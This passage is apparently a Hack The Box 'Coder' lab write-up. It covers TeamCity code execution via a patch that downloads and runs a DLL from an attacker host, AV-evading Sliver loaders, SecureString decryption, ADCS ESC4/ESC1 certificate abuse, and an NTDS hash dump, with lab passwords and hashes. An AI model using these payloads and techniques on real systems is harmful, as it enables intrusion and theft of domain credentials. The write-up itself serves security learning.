MasterKey: PM2CG6RO73QT74WS
---------------------------
```

###### Login

Now I just used the `skyblade` encryption key and imported the backup file into my `Authenticator` plugin. Now we can login and enter the `TOTP` we got from the plugin.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189263747768926258/image.png?ex=659d872c&is=658b122c&hm=14ca07f3e8ed113e4250d8586db19b241092fdabc5aa92053df59e9bf59be4e2&)

But unfortunately I got an error that my `TOTP` was not valid. After a bit of research I found out that this is due to my computer clock. My computer clock needs to be synchronized with the AD time to get a correct `TOTP`.

```ad-info
title: TOTP Time Issues

This has been observed when the appliance or the user device/App and their correct time/time zone are not in sync. TOTP is an algorithm that computes a one-time password from a shared secret key(this is done in the form of a QRCode) and the current time. Therefore, it is very important to make sure that the SMA/UTM appliances and the end user devices/Apps are set to the right time and date.
```

So I just updated my clock to the server time with `ntpdate`.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ sudo ntpdate `box`
2023-12-27 01:54:05.614635 (+0100) +15123.630695 +/- 0.020358 10.129.229.190 s1 no-leap
CLOCK: time stepped by 15123.630695
```

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189264426675732581/image.png?ex=659d87ce&is=658b12ce&hm=cb423513c18e4479fe2e13196beecac3dc04fac1ce94a034f2202f86cfe20476&)



Great, now we are logged into the `TeamCity CI/CD`and i just started to find out how i can get code execution on the `dc01`agent.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189265212176605204/image.png?ex=659d888a&is=658b138a&hm=6e81bc7f5b32c6082bd7cb26bb8a91203b1649107e99166728cc1d16c58ad0e1&)

In the log message we see *Hello World*, so this is probably running the `hello-world.ps1` script in the `Migrations` share.

###### Personal Build

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189537354642366535/image-20231120155034852.png?ex=659e85fd&is=658c10fd&hm=2c0a9310cbaa4114100f5dc6bb47a2bc89edc72c9fa78236259718a355597f75&)

"run as personal" build sounds very interesting, lets check the `Jetbrains` documentation and see what this is.

```ad-info
title: Personal Build

A _personal build_ is a build-out of the common build sequence which typically uses the changes not yet committed into the version control. Personal builds are usually initiated from one of the [supported IDEs](https://www.jetbrains.com/help/teamcity/supported-platforms-and-environments.html#Remote+Run+and+Pre-tested+Commit) via the [Remote Run](https://www.jetbrains.com/help/teamcity/remote-run.html) procedure. You can also upload a patch with changes directly to the server, as described [below](https://www.jetbrains.com/help/teamcity/personal-build.html#Direct+Patch+Upload).
```

So based on that we can just upload a patch and the patch will be executed on the server. So I just fired up `sliver` and generated a beacon as shell code. As we want to be exited (not trigger the AV) im going to generate a loader with `ScareCrow`.

*Generating the Sliver shellcode*

```bash
sliver > generate beacon --http 10.10.14.137 --seconds 5 --jitter 3 --os windows --arch x64 --format shellcode -G --skip-symbols

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/ar0x/Desktop/HTB/Machines/Coder/PLANNED_MIGRANT.bin
```

*Generating the Loader*

```bash
┌──(ar0x㉿kali)-[~/Tools/DefenseEvasion/ScareCrow]
└─$ ./ScareCrow -I ~/Desktop/HTB/Machines/Coder/PETITE_POIGNANCE.bin -domain coder.htb -Loader dll

  _________                           _________
 /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
 \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
 /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     /
/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/
        \/     \/     \/            \/        \/
                                                        (@Tyl0us)
        “Fear, you must understand is more than a mere obstacle.
        Fear is a TEACHER. the first one you ever had.”

[!] Missing Garble... Downloading it now
[*] Encrypting Shellcode Using ELZMA Encryption
[+] Shellcode Encrypted
[+] Patched ETW Enabled
[+] Patched AMSI Enabled
[+] Sleep Timer set for 2633 milliseconds
[*] Creating an Embedded Resource File
[+] Created Embedded Resource File With sechost's Properties
[*] Compiling Payload
[+] Payload Compiled
[*] Signing sechost.dll With a Fake Cert
[+] Signed File Created
[!] Sha256 hash of sechost.dll: d813ce0e9976871dacf124eb19ab744a3a8ba3e4806cd57cd8e96ca5104a1828
[+] DLL Compiled
[!] Note: Loading a dll (with Rundll32 or Regsvr32) that has the same name as a valid system DLL will cause problems, in this case its best to change the name slightly
```

Great, now we have our `Loader` and we are ready to go. Now we just need to create the patch and file and upload it to the server to get access to the server.

```powershell
wget 10.10.14.137:8000/combase.dll -O C:\Windows\Temp\combase.dll; rundll32.exe C:\Windows\Temp\combase.dll,DllRegisterServer
```

I changed the `write-host "Hello, World!"` to the new payload and generated a patch file with `git diff`.

```diff
┌──(ar0x㉿kali)-[~/…/Machines/Coder/Migrations/teamcity_test_repo]
└─$ git diff hello_world.ps1
diff --git a/hello_world.ps1 b/hello_world.ps1
index 09724d2..cd3a2d1 100644
--- a/hello_world.ps1
+++ b/hello_world.ps1
@@ -1,2 +1,2 @@
 #Simple repo test for Teamcity pipeline
-write-host "Hello, World!"
+wget 10.10.14.137:8000/combase.dll -O C:\Windows\Temp\combase.dll; rundll32.exe C:\Windows\Temp\combase.dll,DllRegisterServer
```

So now all we need to do is upload the patch file and wait for `sliver` to get a callback from the server.

```bash
[*] Beacon bc711cd7 PLANNED_MIGRANT - 10.129.229.190:60617 (dc01) - windows/amd64 - Wed, 27 Dec 2023 03:09:09 CET
```

So we can see that we got a session as `svc_teamcity`

```bash
sliver (ESTIMATED_CULTIVATOR) > whoami

Logon ID: CODER\svc_teamcity
[*] Current Token ID: CODER\svc_teamcity
sliver (ESTIMATED_CULTIVATOR) >
```


## Privilege Escalation to e.black
#### Shell as e.black
##### Recover the Secure String

After a lot time enumrating i found he the folder that saved our patches. We can see that `101.changes.diff` is from 2022 and the rest of patches are these that i uploaded on the server. 

```bash
PS C:\ProgramData\JetBrains\TeamCity\system\changes> ls
ls
Directory: C:\ProgramData\JetBrains\TeamCity\system\changes


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/8/2022   2:18 PM           1707 101.changes.diff
-a----       12/26/2023   5:45 PM            247 201.changes.diff
-a----       12/26/2023   5:48 PM            247 202.changes.diff
-a----       12/26/2023   5:48 PM            334 203.changes.diff
-a----       12/26/2023   5:58 PM            323 204.changes.diff
-a----       12/26/2023   5:58 PM            323 205.changes.diff
-a----       12/26/2023   6:00 PM            323 206.changes.diff
-a----       12/26/2023   6:03 PM            323 207.changes.diff
-a----       12/26/2023   6:07 PM            323 208.changes.diff
-a----       12/26/2023   6:10 PM            323 209.changes.diff
-a----       12/26/2023   6:18 PM            333 210.changes.diff
-a----       12/26/2023   6:18 PM            333 211.changes.diff
```

*Content of 101.changes.diff*

```diff
diff --git a/enc.txt b/enc.txt
new file mode 100644
index 0000000..d352634
--- /dev/null
+++ b/enc.txt
@@ -0,0 +1,2 @@
+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN
+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==
diff --git a/key.key b/key.key
new file mode 100644
index 0000000..a6285ed
--- /dev/null
+++ b/key.key
@@ -0,0 +1,32 @@
+144
+255
+52
+33
+65
+190
+44
+106
+131
+60
+175
+129
+127
+179
+69
+28
+241
+70
+183
+53
+153
+196
+10
+126
+108
+164
+172
+142
+119
+112
+20
+122
```

Looking at this, I noticed that it was a `Powershell Secure String` and its pretty easy to get the decrypted password since we have the key.

So I just copied the `diff` file to my machine and with `git apply` I just extracted and saved the change to my machine.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ git apply diff.git

┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ ls
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 18:47:53 2023    authenticator_cracker/
   rwxr-xr-x   2   ar0x   ar0x      4 KiB   Tue Dec 26 12:11:20 2023    Decrypted/
   rwxr-xr-x   7   ar0x   ar0x      4 KiB   Wed Dec 27 02:15:57 2023    Migrations/
   rwxr-xr-x   2   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:10 2023    Temporary Projects/
   rw-r--r--   1   ar0x   ar0x      9 MiB   Wed Dec 27 03:16:27 2023    combase.dll
   rw-r--r--   1   ar0x   ar0x    840 B     Wed Dec 27 04:03:50 2023    diff.git
   rw-r--r--   1   ar0x   ar0x    450 B     Wed Dec 27 04:04:41 2023    enc.txt
   rwx------   1   ar0x   ar0x     10 MiB   Wed Dec 27 03:15:21 2023    ESTIMATED_CULTIVATOR.bin
   rw-r--r--   1   ar0x   ar0x    117 B     Wed Dec 27 04:04:41 2023    key.key
   rw-r--r--   1   ar0x   ar0x     44 KiB   Wed Dec 27 02:56:19 2023    nc.exe
   rw-r--r--   1   root   root      3 KiB   Tue Dec 26 10:29:28 2023    nmap
   rw-r--r--   1   ar0x   ar0x    620 B     Tue Dec 26 12:23:09 2023    sblade_authenticator.json
```

So now should start `pwsh` on kali and start decrypting the `Secure String`. First we have to read and store the key and then we have to read the `Secure String` and create a `Secure String` object from it and then we have to create a `PSCredential` object with the created `Secure String` object. Finally the `GetNetworkCredential()` function will return the clear text password.

```bash
┌──(ar0x㉿kali)-[/home/ar0x/Desktop/HTB/Machines/Coder]
└─PS> $key = Get-Content ./key.key

┌──(ar0x㉿kali)-[/home/ar0x/Desktop/HTB/Machines/Coder]
└─PS> $pass = (Get-Content ./enc.txt | ConvertTo-SecureString -Key $key);

┌──(ar0x㉿kali)-[/home/ar0x/Desktop/HTB/Machines/Coder]
└─PS> $cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder.htb/e.black",$pass);

┌──(ar0x㉿kali)-[/home/ar0x/Desktop/HTB/Machines/Coder]
└─PS> $cred.GetNetworkCredential().Password
ypOSJXPqlDOxxbQSfEERy300
```

##### Check the Credentials

So let us test if we can log in with the new password we found as `e.black`.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ netexec smb coder.htb -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300'
SMB         10.129.229.190  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.190  445    DC01             [+] coder.htb\e.black:ypOSJXPqlDOxxbQSfEERy300

```

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ netexec winrm coder.htb -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300'
SMB         10.129.229.190  445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:coder.htb)
WINRM       10.129.229.190  5985   DC01             [+] coder.htb\e.black:ypOSJXPqlDOxxbQSfEERy300 (Pwn3d!)
```

Very nice, the password worked and now we can use `evil-winrm` to get `PSSession` as `e.black` on the system. After getting shell, we also get our first flag. NICE!

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ evil-winrm -i coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\e.black\Documents> cat ../Desktop/user.txt
6312dec89306308a3a983b2acf13a9b0
```

## Privilege Escalation
#### Shell as Administrator
##### Enumeration

So let us enumerate `e.black`. Oh very interesting, `e.black` is in the `PKI Admins` group. This group is used for `ADCS certificate and template management'. 

Note: `PKI Admins` is not a default group. This is a custom group created in a corporate environment for specific administrative purposes related to PKI.


```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> net user e.black
User name                    e.black
Full Name                    Erron Black
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/7/2022 11:40:31 AM
Password expires             Never
Password changeable          11/8/2022 11:40:31 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/8/2022 2:05:01 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *PKI Admins
The command completed successfully.
```

```
*Evil-WinRM* PS C:\Users\e.black\Documents> net group "PKI Admins"
Group name     PKI Admins
Comment        ADCS Certificate and Template Management

Members

-------------------------------------------------------------------------------
e.black
The command completed successfully.
```

This means that we can manage the hole PKI. So the attack path is clear, create a vulnerable certificate template and then abuse it.
##### Vulnerable Template

To create certificate templates without GUI, we need a tool called 
[ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate).

```ad-info
title: ADCSTemplate

A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds, but it could also be used in production environments to move templates between AD CS environments.
```

So I just uploaded the script to the machine and imported the module.

Actually the attack path we want to implement is `ESC4 -> ESC1` which means we have control over a certificate template (ESC4) and then we can modify it and set the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x00000001) bitmask for the `msPKI-Certificate-Name-Flag` property. (ESC1)

```bash
*Evil-WinRM* PS C:\Users\e.black\Documents> Export-ADCSTemplate -displayName Computer > computer.json
*Evil-WinRM* PS C:\Users\e.black\Documents> $computer = cat computer.json -raw | ConvertFrom-Json
*Evil-WinRM* PS C:\Users\e.black\Documents> $computer.'msPKI-Certificate-Name-Flag' = 0x1
*Evil-WinRM* PS C:\Users\e.black\Documents> $computer | ConvertTo-Json | Set-Content computer-mod-esc1.json
*Evil-WinRM* PS C:\Users\e.black\Documents> New-ADCSTemplate -DisplayName "Computer-ESC1" -Publish -JSON (cat computer-mod-esc1.json -raw)

*Evil-WinRM* PS C:\Users\e.black\Documents> Set-ADCSTemplateACL -DisplayName "Computer-ESC1" -type allow -identity 'coder\e.black' -enroll
```

The fist step to that, is exporting a current certificate template, in this case i exported the `Comptuer` certificate. Than i read and saved the the certifiacte in json format in a variable. Now we can set the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` for `msPKI-Certificate-Name-Flag` property. Technically we are done, we have to just publish the certificate and allow `e.black` to enroll to this certificate.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ certipy-ad find -username e.black@coder.htb -password 'ypOSJXPqlDOxxbQSfEERy300' -json -vulnerable
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'coder-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'coder-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'coder-DC01-CA' via RRP
[*] Got CA configuration for 'coder-DC01-CA'
[*] Saved JSON output to '20231227051420_Certipy.json'
```

If we have done everything correctly, `certipy` should now show us `Computer-ESC1` as a vulnerable certificate template.

```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "coder-DC01-CA",
      "DNS Name": "dc01.coder.htb",
      "Certificate Subject": "CN=coder-DC01-CA, DC=coder, DC=htb",
      "Certificate Serial Number": "2180F0D10CFECB9840260D0730724BDF",
      "Certificate Validity Start": "2022-06-29 03:51:44+00:00",
      "Certificate Validity End": "2052-06-29 04:01:44+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "CODER.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "CODER.HTB\\Administrators",
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Enterprise Admins"
          ],
          "2": [
            "CODER.HTB\\Administrators",
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Enterprise Admins"
          ],
          "512": [
            "CODER.HTB\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "Computer-ESC1",
      "Display Name": "Computer-ESC1",
      "Certificate Authorities": [
        "coder-DC01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        "EnrolleeSuppliesSubject"
      ],
      "Enrollment Flag": [
        "AutoEnrollment"
      ],
      "Extended Key Usage": [
        "Server Authentication",
        "Client Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "CODER.HTB\\Erron Black"
          ]
        },
        "Object Control Permissions": {
          "Owner": "CODER.HTB\\Erron Black",
          "Full Control Principals": [
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Local System",
            "CODER.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Local System",
            "CODER.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Local System",
            "CODER.HTB\\Enterprise Admins"
          ],
          "Write Property Principals": [
            "CODER.HTB\\Domain Admins",
            "CODER.HTB\\Local System",
            "CODER.HTB\\Enterprise Admins"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC1": "'CODER.HTB\\\\Erron Black' can enroll, enrollee supplies subject and template allows client authentication",
        "ESC4": "Template is owned by CODER.HTB\\Erron Black"
      }
    }
  }
}

```

And yes, it does. Nice, we are almost domain admin. Now all we have to do is abuse this certificate. Now we have to request a certificate in the name of 'administrator' and if this succeeds we will get a `pfx` file. After getting the `pfx' file we can log in to the domain as the administrator.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ certipy-ad req -username e.black@coder.htb -password 'ypOSJXPqlDOxxbQSfEERy300' -ca coder-DC01-CA -target coder.htb -template "Computer-ESC1" -upn "administrator@coder.htb"
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 19
[*] Got certificate with UPN 'administrator@coder.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

So we impersonated the certificate and successfully got the `pfx' file, and now we should just use that for authentication.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ certipy-ad auth -pfx administrator.pfx -domain coder.htb -ns `box`
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@coder.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@coder.htb': aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7
```

Voila, we have the NTLM hash of the domain admin and here we have our root flag.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ evil-winrm -u administrator -H 807726fcf9f188adc26eeafd7dc16bb7 -i coder.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
3f100e76d55d9d847a41013adcece6bb
```

And also a dump of the `NTDS`.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ secretsdump.py coder.htb/administrator@coder.htb -hashes :807726fcf9f188adc26eeafd7dc16bb7 -just-dc-ntlm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::
coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::
coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::
coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::
coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::
coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::
coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::
[*] Cleaning up...
```



---
#### Lessons learned
- ADCSTemplate
- Detailed information about ADCS attacks
- Working with Teamcity CI/CD
